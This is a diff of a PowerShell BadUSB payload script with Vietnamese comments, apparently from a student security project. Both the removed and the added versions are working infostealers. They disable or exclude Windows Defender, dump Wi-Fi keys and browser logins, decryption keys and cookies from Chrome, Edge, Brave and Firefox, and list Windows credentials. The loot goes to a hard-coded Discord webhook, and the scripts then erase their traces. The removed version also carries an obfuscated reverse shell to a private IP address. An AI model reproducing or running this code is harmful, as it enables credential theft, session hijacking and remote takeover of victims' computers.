@@ -1,219 +1,245 @@
-#                      _                        
-#  _   _  ___  _   _  | | ___ __   _____      __
-# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
-# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
-#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
-#  |___/                                        
+#-- Payload configuration --#
 
-$basePath = "C:\Users\$env:USERNAME\Downloads\scripts"
-$dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
-$dumpFile = "$dumpFolder.zip"
+$WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj'
 
-# Create directory
-New-Item -ItemType Directory -Path $basePath -Force | Out-Null
-Set-Location $basePath
-New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
-Add-MpPreference -ExclusionPath $basePath -Force
+# Tắt Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
-# Download necessary tools
-$zipUrl = "https://github.com/Sunlaii/ANM-Esp32BadUSB/raw/refs/heads/MinhNhat/tools.zip"
-Invoke-WebRequest $zipUrl -OutFile "tools.zip"
-
-# Giải nén ngay lập tức
-Expand-Archive -Path "tools.zip" -DestinationPath "." -Force
-
-# CHẠY ĐA LUỒNG: Kích hoạt 4 công cụ quét cùng một lúc
-Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden
-Start-Process -FilePath ".\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext history.txt" -WindowStyle Hidden
-Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden
-Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden
-
-# Wait for the files to be fully written
-while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
-    Start-Sleep -Milliseconds 100
+# Tạo thư mục tạm
+$tempDir = "$env:TEMP\Exfil_$env:USERNAME"
+if (-Not (Test-Path $tempDir)) {
+    New-Item -ItemType Directory -Path $tempDir -Force
 }
 
-Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
+# ==========================================
+# DISCORD WEBHOOK FUNCTIONS
+# ==========================================
 
-# ============================================
-# NÉN DỮ LIỆU (ĐÃ SỬA LỖI)
-# ============================================
-
-# Đợi file được ghi hoàn tất
-Start-Sleep -Seconds 2
-
-# Kiểm tra thư mục dump có file không
-$fileCount = (Get-ChildItem "$dumpFolder" -File -ErrorAction SilentlyContinue).Count
-Write-Output "Số file trong thư mục dump: $fileCount"
-
-if ($fileCount -eq 0) {
-    Write-Output "Không có file nào để nén! Thoát."
-    exit 1
+function Send-DiscordMessage {
+    param([string]$Message)
+    try {
+        $payload = @{ content = $Message } | ConvertTo-Json
+        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+    } catch {}
 }
 
-# Xóa file zip cũ nếu tồn tại
-if (Test-Path "$dumpFile") {
-    Remove-Item "$dumpFile" -Force
-}
-
-# Nén bằng .NET (ổn định hơn Compress-Archive)
-try {
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    $zip = [System.IO.Compression.ZipFile]::Open("$dumpFile", 'Create')
-    Get-ChildItem -Path "$dumpFolder" -Recurse | ForEach-Object {
-        $relativePath = $_.FullName.Substring($dumpFolder.Length + 1)
-        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $relativePath)
-    }
-    $zip.Dispose()
-    Write-Output "Đã nén thành công: $dumpFile"
-} catch {
-    Write-Output "Lỗi nén: $_"
-    exit 1
-}
-
-# Kiểm tra file zip có được tạo không
-if ((Test-Path "$dumpFile") -and ((Get-Item "$dumpFile").Length -gt 0)) {
-    Write-Output "File zip đã được tạo, kích thước: $((Get-Item "$dumpFile").Length) bytes"
-} else {
-    Write-Output "File zip không được tạo hoặc bị rỗng!"
-    exit 1
-}
-
-# ============================================
-# DISCORD WEBHOOK CONFIG
-# ============================================
-
-$dc = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
-$hookurl = "$dc"
-if ($hookurl.Length -lt 120){
-    $hookurl = ("https://discord.com/api/webhooks/" + "$dc")
-}
-
-# ============================================
-# GỬI FILE ZIP QUA DISCORD
-# ============================================
-
-if (Test-Path "$dumpFile") {
-    $fileBytes = [System.IO.File]::ReadAllBytes("$dumpFile")
-    $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
+function Send-DiscordFile {
+    param([string]$FilePath, [string]$Description = "")
     
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $multipartContent = @"
---$boundary
-Content-Disposition: form-data; name="file1"; filename="$([System.IO.Path]::GetFileName("$dumpFile"))"
-Content-Type: application/zip
-
-$fileBase64
---$boundary--
-"@
-    $headers = @{"Content-Type" = "multipart/form-data; boundary=$boundary"}
+    if (-Not (Test-Path $FilePath)) { return }
+    
+    $fileSize = (Get-Item $FilePath).Length
+    if ($fileSize -gt 25MB) {
+        $compressedPath = "$env:TEMP\compressed_$(Split-Path $FilePath -Leaf).zip"
+        Compress-Archive -Path $FilePath -DestinationPath $compressedPath -CompressionLevel Optimal -Force
+        $FilePath = $compressedPath
+    }
     
     try {
-        Invoke-RestMethod -Uri $hookurl -Method Post -Body $multipartContent -Headers $headers -UseBasicParsing
-        Write-Output "Đã gửi file zip qua Discord thành công!"
-    } catch {
-        Write-Output "Lỗi gửi file zip: $_"
-    }
-}
-
-# ============================================
-# ẨN CỬA SỔ (CHO FINDSEND)
-# ============================================
-
-$hide = 'y'
-if($hide -eq 'y'){
-    $w=(Get-Process -PID $pid).MainWindowHandle
-    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
-    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
-    if($w -ne [System.IntPtr]::Zero){
-        $t::ShowWindowAsync($w,0)
-    }else{
-        $Host.UI.RawUI.WindowTitle = 'xx'
-        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
-        $w=$p.MainWindowHandle
-        $t::ShowWindowAsync($w,0)
-    }
-}
-
-# ============================================
-# FINDSEND (QUÉT FILE VÀ GỬI QUA DISCORD)
-# ============================================
-
-Function FindAndSend {
-    param ([string[]]$FileType,[string[]]$Path)
-    $maxZipFileSize = 10MB
-    $currentZipSize = 0
-    $index = 1
-    $zipFilePath ="$env:temp/Loot$index.zip"
-    
-    $Path = "DownLoads"
-    If($Path -ne $null){
-        $foldersToSearch = "$env:USERPROFILE\"+$Path
-    }else{
-        $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
-    }
-    
-    If($FileType -ne $null){
-        $fileExtensions = "*."+$FileType
-    }else {
-        $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
-    }
-    
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
-    
-    foreach ($folder in $foldersToSearch) {
-        foreach ($extension in $fileExtensions) {
-            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
-            foreach ($file in $files) {
-                $fileSize = $file.Length
-                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
-                    $zipArchive.Dispose()
-                    $currentZipSize = 0
-                    curl.exe -F file1=@"$zipFilePath" $hookurl
-                    Remove-Item -Path $zipFilePath -Force
-                    Sleep 1
-                    $index++
-                    $zipFilePath ="$env:temp/Loot$index.zip"
-                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+        $fileName = Split-Path $FilePath -Leaf
+        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $base64Content = [Convert]::ToBase64String($fileBytes)
+        
+        $payload = @{
+            content = $Description
+            files = @(
+                @{
+                    name = $fileName
+                    content = $base64Content
                 }
-                $entryName = $file.FullName.Substring($folder.Length + 1)
-                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
-                $currentZipSize += $fileSize
-            }
-        }
-    }
-    $zipArchive.Dispose()
-    curl.exe -F file1=@"$zipFilePath" $hookurl
-    Remove-Item -Path $zipFilePath -Force
-    Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
+            )
+        } | ConvertTo-Json -Depth 10
+        
+        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+    } catch {}
 }
 
-FindAndSend
+# ==========================================
+# HÀM COPY FILE AN TOÀN (XỬ LÝ FILE BỊ LOCK)
+# ==========================================
+function Safe-CopyFile {
+    param([string]$Source, [string]$Destination)
+    
+    if (-not (Test-Path $Source)) { 
+        Write-Host "[-] Not found: $Source"
+        return $false 
+    }
+    
+    try {
+        # Thử copy bình thường
+        Copy-Item -Path $Source -Destination $Destination -Force -ErrorAction Stop
+        Write-Host "[+] Copied: $(Split-Path $Destination -Leaf)"
+        return $true
+    } catch {
+        # Nếu lỗi do lock, dùng cmd copy
+        Write-Host "[!] File locked, trying alternative: $(Split-Path $Source -Leaf)"
+        $tempFile = "$env:TEMP\$([Guid]::NewGuid()).tmp"
+        cmd /c "copy `"$Source`" `"$tempFile`"" 2>nul
+        if (Test-Path $tempFile) {
+            Copy-Item $tempFile $Destination -Force
+            Remove-Item $tempFile -Force
+            return $true
+        }
+        return $false
+    }
+}
 
-# ============================================
-# DỌN DẸP DẤU VẾT
-# ============================================
+# ==========================================
+# BẮT ĐẦU ĐÁNH CẮP
+# ==========================================
 
-Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+Send-DiscordMessage "🎯 **TARGET: $env:COMPUTERNAME - $env:USERNAME**"
+Start-Sleep -Seconds 1
 
-try {
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
-    Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
-} catch {}
+# 1. Lấy mật khẩu WiFi (cải thiện)
+Send-DiscordMessage "📡 **Extracting WiFi passwords...**"
+netsh wlan export profile key=clear folder="$tempDir" > $null
+# Gộp tất cả XML thành 1 file text dễ đọc
+$wifiFile = "$tempDir\WiFi_Details.txt"
+"="*60 | Out-File $wifiFile
+"WiFi Passwords for $env:COMPUTERNAME" | Out-File $wifiFile -Append
+"Extracted on: $(Get-Date)" | Out-File $wifiFile -Append
+"="*60 | Out-File $wifiFile -Append
+"" | Out-File $wifiFile -Append
 
-Set-Location "C:\"
-Remove-Item -Path $basePath -Recurse -Force
-Remove-MpPreference -ExclusionPath $basePath -Force
+Get-ChildItem "$tempDir\*.xml" | ForEach-Object {
+    $content = Get-Content $_.FullName -Raw
+    if ($content -match '<name>(.+?)</name>') { $ssid = $matches[1] }
+    if ($content -match '<keyMaterial>(.+?)</keyMaterial>') { $pass = $matches[1] }
+    else { $pass = "No password (Open network)" }
+    "[$ssid] $pass" | Out-File $wifiFile -Append
+}
+Send-DiscordFile -FilePath $wifiFile -Description "📡 WiFi Passwords"
 
-# ============================================
-# REVERSE SHELL
-# ============================================
+# 2. Lấy thông tin hệ thống (cải thiện)
+Send-DiscordMessage "💻 **Collecting system information...**"
+$sysFile = "$tempDir\SystemInfo.txt"
+"System Information for $env:COMPUTERNAME" | Out-File $sysFile
+"="*60 | Out-File $sysFile -Append
+Get-ComputerInfo | Out-File $sysFile -Append
+"" | Out-File $sysFile -Append
+"Local Users:" | Out-File $sysFile -Append
+"-"*30 | Out-File $sysFile -Append
+Get-LocalUser | Where-Object { $_.Enabled } | Out-File $sysFile -Append
+Send-DiscordFile -FilePath $sysFile -Description "💻 System Information"
 
-$47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358='P'+'S ';$4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c='1'+""+'9'+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+""+'2'+'.'+""+""+'1'+""+'6'+""+""+""+""+""+""+""+""+""+""+""+""+""+'8'+'.'+'2'+'.'+""+'4'+""+""+""+""+""+""+""+"";$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d = n''ew''-OB''je''CT system.net.sockets.tcpclient($4782544cc93c0fb50e03cbf764a54693c8e3b075ca763f3fdbb9de95b1330e5c44bf5512335caa51442f1a159d8877ba179aa5268624d4200a1d170c893ad63c,6969);$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1 = $948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.GetStream();[byte[]]$bytes = 0..65535|%{0};sleep(0.1);sleep(0.1);sleep(0.1);sleep(0.1);while(($i = $06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Read($bytes, 0, $bytes.Length)) -ne 0){;$2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 = (n''Ew-oB''J''eC''t -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i''e''x'' -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire $2df91d337f6f62021157bbfe1826d2fa61ce752dbea78160523fb1232ae0e773 2>&1 | O''U''t-S''TrI''n''G );$sendback2 = $sendback + $47f6eed18a29937a718172f3bab39b6d8b68f46cd46734d222793dfc51b39358.SubString(0,3) + (SP''L''iT-P''A''t''h -path "$(p''w''D'')\0x00") + '> ';sleep 0.01;sleep 0.01;$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb = ([text.encoding]::ASCII).GetBytes($sendback2);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Write($d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb,0,$d3bc0f0a16698f7816456b52999306721831b002971b9f09c7fffa8c947ace7537618044e30ec4c0ecfedff2c5b481b8dfae1611b0649da555ca483d6d5af7fb.Length);sleep 0.01;$06060b1118e0150f82b45941e3eebe81daecaee17e7b6be173ce7bbf56e571d1.Flush()};sleep 0.01;$948fe603f61dc036b5c596dc09fe3ce3f3d30dc90f024c85f3c82db2ccab679d.Close()
+# 3. Google Chrome (ĐÃ SỬA - thêm Local State và xử lý lock)
+Send-DiscordMessage "🌐 **Extracting Chrome credentials...**"
+$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+$chromeDest = "$tempDir\Chrome"
+New-Item -ItemType Directory -Path $chromeDest -Force
 
-# ============================================
-# KẾT THÚC
-# ============================================
+# Copy Login Data (xử lý lock)
+Safe-CopyFile "$chromeDir\Login Data" "$chromeDest\Login Data"
+# Copy Local State (QUAN TRỌNG - để giải mã)
+Safe-CopyFile "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" "$chromeDest\Local State"
+# Copy Cookies (thêm để ăn cắp session)
+Safe-CopyFile "$chromeDir\Cookies" "$chromeDest\Cookies"
 
-Stop-Process -Id $PID -Force
+if ((Get-ChildItem $chromeDest -File).Count -gt 0) {
+    # Nén lại trước khi gửi
+    $chromeZip = "$env:TEMP\Chrome_Data.zip"
+    Compress-Archive -Path "$chromeDest\*" -DestinationPath $chromeZip -Force
+    Send-DiscordFile -FilePath $chromeZip -Description "🌐 Chrome Credentials (Login Data + Local State + Cookies)"
+    Remove-Item $chromeZip -Force
+}
+
+# 4. Microsoft Edge (tương tự Chrome)
+Send-DiscordMessage "🌐 **Extracting Edge credentials...**"
+$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+$edgeDest = "$tempDir\Edge"
+New-Item -ItemType Directory -Path $edgeDest -Force
+
+Safe-CopyFile "$edgeDir\Login Data" "$edgeDest\Login Data"
+Safe-CopyFile "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" "$edgeDest\Local State"
+
+if ((Get-ChildItem $edgeDest -File).Count -gt 0) {
+    $edgeZip = "$env:TEMP\Edge_Data.zip"
+    Compress-Archive -Path "$edgeDest\*" -DestinationPath $edgeZip -Force
+    Send-DiscordFile -FilePath $edgeZip -Description "🌐 Edge Credentials (Login Data + Local State)"
+    Remove-Item $edgeZip -Force
+}
+
+# 5. Brave Browser (THÊM MỚI)
+Send-DiscordMessage "🌐 **Extracting Brave credentials...**"
+$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
+if (Test-Path $braveDir) {
+    $braveDest = "$tempDir\Brave"
+    New-Item -ItemType Directory -Path $braveDest -Force
+    
+    Safe-CopyFile "$braveDir\Login Data" "$braveDest\Login Data"
+    Safe-CopyFile "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" "$braveDest\Local State"
+    
+    if ((Get-ChildItem $braveDest -File).Count -gt 0) {
+        $braveZip = "$env:TEMP\Brave_Data.zip"
+        Compress-Archive -Path "$braveDest\*" -DestinationPath $braveZip -Force
+        Send-DiscordFile -FilePath $braveZip -Description "🌐 Brave Credentials (Login Data + Local State)"
+        Remove-Item $braveZip -Force
+    }
+}
+
+# 6. Firefox (ĐÃ SỬA - thêm key4.db)
+Send-DiscordMessage "🦊 **Extracting Firefox credentials...**"
+$firefoxProfile = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "*.default-release" | Select-Object -First 1
+if ($firefoxProfile) {
+    $firefoxDest = "$tempDir\Firefox"
+    New-Item -ItemType Directory -Path $firefoxDest -Force
+    
+    # Copy logins.json (mật khẩu)
+    Safe-CopyFile "$($firefoxProfile.FullName)\logins.json" "$firefoxDest\logins.json"
+    # Copy key4.db (khóa giải mã) - QUAN TRỌNG
+    Safe-CopyFile "$($firefoxProfile.FullName)\key4.db" "$firefoxDest\key4.db"
+    # Copy cookies.sqlite (session)
+    Safe-CopyFile "$($firefoxProfile.FullName)\cookies.sqlite" "$firefoxDest\cookies.sqlite"
+    
+    if ((Get-ChildItem $firefoxDest -File).Count -gt 0) {
+        $firefoxZip = "$env:TEMP\Firefox_Data.zip"
+        Compress-Archive -Path "$firefoxDest\*" -DestinationPath $firefoxZip -Force
+        Send-DiscordFile -FilePath $firefoxZip -Description "🦊 Firefox Credentials (logins.json + key4.db)"
+        Remove-Item $firefoxZip -Force
+    }
+}
+
+# 7. Lấy thêm mật khẩu từ Windows Credential Manager (TÙY CHỌN)
+Send-DiscordMessage "🔑 **Extracting Windows credentials...**"
+$credFile = "$tempDir\Windows_Credentials.txt"
+cmdkey /list | Out-File $credFile
+Send-DiscordFile -FilePath $credFile -Description "🔑 Windows Credential Manager"
+
+# 8. Lấy lịch sử PowerShell (dấu vết)
+$psHistory = Get-PSReadLineOption -ErrorAction SilentlyContinue | Select-Object -ExpandProperty HistorySavePath
+if ($psHistory -and (Test-Path $psHistory)) {
+    Copy-Item $psHistory "$tempDir\PS_History.txt" -Force
+    Send-DiscordFile -FilePath "$tempDir\PS_History.txt" -Description "📜 PowerShell History"
+}
+
+# ==========================================
+# TỔNG KẾT
+# ==========================================
+
+# Tính tổng dung lượng
+$totalSize = [math]::Round((Get-ChildItem $tempDir -Recurse -File | Measure-Object -Property Length -Sum).Sum / 1MB, 2)
+
+Send-DiscordMessage "✅ **EXFILTRATION COMPLETED!**"
+Send-DiscordMessage "📊 **Summary:**"
+Send-DiscordMessage "- **Target:** $env:COMPUTERNAME"
+Send-DiscordMessage "- **User:** $env:USERNAME"
+Send-DiscordMessage "- **Size:** $totalSize MB"
+Send-DiscordMessage "- **Time:** $(Get-Date -Format 'HH:mm:ss')"
+
+# ==========================================
+# DỌN DẸP
+# ==========================================
+
+# Xóa thư mục tạm
+Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+
+# Xóa lịch sử PowerShell hiện tại
+Clear-History
+Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+
+# Bật lại Defender (che giấu)
+Start-Sleep -Seconds 2
+Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+
+exit
